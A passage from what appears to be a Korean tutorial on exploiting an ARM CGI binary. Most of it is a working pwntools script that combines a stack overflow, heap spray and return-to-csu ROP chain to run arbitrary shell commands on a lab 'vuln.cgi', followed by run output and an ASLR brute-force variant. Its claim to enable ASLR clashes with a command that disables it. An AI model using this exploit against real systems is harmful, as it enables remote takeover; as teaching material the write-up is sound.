</span><span class="n">sled_2</span> <span class="o">=</span> <span class="mh">0x000108e0</span> <span class="c1"># pop {r4, r11, pc}
</span><span class="n">csu_1</span>  <span class="o">=</span> <span class="mh">0x00010d28</span>
<span class="n">csu_2</span>  <span class="o">=</span> <span class="mh">0x00010d0c</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="c1"># ETC.
</span><span class="n">str_t</span> <span class="o">=</span> <span class="mh">0x10e66</span>

<span class="k">def</span> <span class="nf">purl32</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x000000ff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x0000ff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x00ff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span>
    <span class="k">return</span> <span class="s">"%{:02x}%{:02x}%{:02x}%{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">spray</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="s">"t=sh"</span><span class="p">,</span> <span class="s">"ifconfig=y"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">spray</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"ss="</span><span class="o">+</span><span class="n">spray</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="o">=</span><span class="mi">54</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>

    <span class="c1"># If we already got spray buffer, use it.
</span>    <span class="k">global</span> <span class="n">spray_fix</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">spray_fix</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">spray_fix</span>

    <span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>    
    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># Forming spray.
</span>    <span class="n">spray</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="n">SPRAY_LEN</span> <span class="o">%</span> <span class="n">EADDR_LEN</span><span class="p">)</span> <span class="c1"># padd
</span>    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>

    <span class="c1"># Fix the spray buffer.
</span>    <span class="n">spray_fix</span> <span class="o">=</span> <span class="n">spray</span>

    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip] [shell command]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bc@machine $ ./exploit.py 172.16.13.9 'echo PWNED &gt; /tmp/pwned'
[*] '/mnt/c/Users/314ckC47/Documents/CGI Exploitation/source/vuln'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[*] Getting buffer.
[*] Exploit.
[*] Success!
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/314ckC47 $ cat /tmp/pwned
PWNED
</code></pre></div></div>

<h3 id="case-aslr-활성화">Case: ASLR 활성화</h3>

<p>다음과 같이 ASLR을 활성화합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<h4 id="종료-조건">종료 조건</h4>

<p><code class="language-plaintext highlighter-rouge">sp</code>가 참조하는 지점에 대해 Brute-forcing을 수행합니다.
Brute-forcing의 종료 조건을 위해 ROP Payload가 성공적으로 수행 될 경우 프로그램을 abort시켜 500 Internal error를 발생시키지 않도록 합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># abort
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="s">"AAAA"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">abort</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="aslr-공격-코드">ASLR 공격 코드</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="c1"># Globals &amp; Defines
</span><span class="n">spray_fix</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">EADDR_LEN</span> <span class="o">=</span> <span class="mi">12</span>

<span class="c1"># Gadgets
</span><span class="n">sled_1</span> <span class="o">=</span> <span class="mh">0x00010ca4</span> <span class="c1"># pop {r11, pc}
</span><span class="n">sled_2</span> <span class="o">=</span> <span class="mh">0x000108e0</span> <span class="c1"># pop {r4, r11, pc}
</span><span class="n">csu_1</span>  <span class="o">=</span> <span class="mh">0x00010d28</span>
<span class="n">csu_2</span>  <span class="o">=</span> <span class="mh">0x00010d0c</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="c1"># ETC.
</span><span class="n">str_t</span> <span class="o">=</span> <span class="mh">0x00010e66</span>
<span class="n">abort</span> <span class="o">=</span> <span class="mh">0x0001055c</span>

<span class="k">def</span> <span class="nf">purl32</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x000000ff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x0000ff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0x00ff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span>
    <span class="k">return</span> <span class="s">"%{:02x}%{:02x}%{:02x}%{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">spray</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">[</span><span class="s">"t=sh"</span><span class="p">,</span> <span class="s">"ifconfig=y"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">spray</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"ss="</span><span class="o">+</span><span class="n">spray</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="o">=</span><span class="mi">54</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>

    <span class="c1"># If we already got spray buffer, use it.
</span>    <span class="k">global</span> <span class="n">spray_fix</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">spray_fix</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">spray_fix</span>

    <span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>
    <span class="c1"># system("sh")
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

    <span class="c1"># abort
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="s">"AAAA"</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">abort</span><span class="p">)</span>

    <span class="c1"># Forming spray.
</span>    <span class="n">spray</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="n">SPRAY_LEN</span> <span class="o">%</span> <span class="n">EADDR_LEN</span><span class="p">)</span> <span class="c1"># padd
</span>    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>

    <span class="c1"># Fix the spray buffer.
</span>    <span class="n">spray_fix</span> <span class="o">=</span> <span class="n">spray</span>

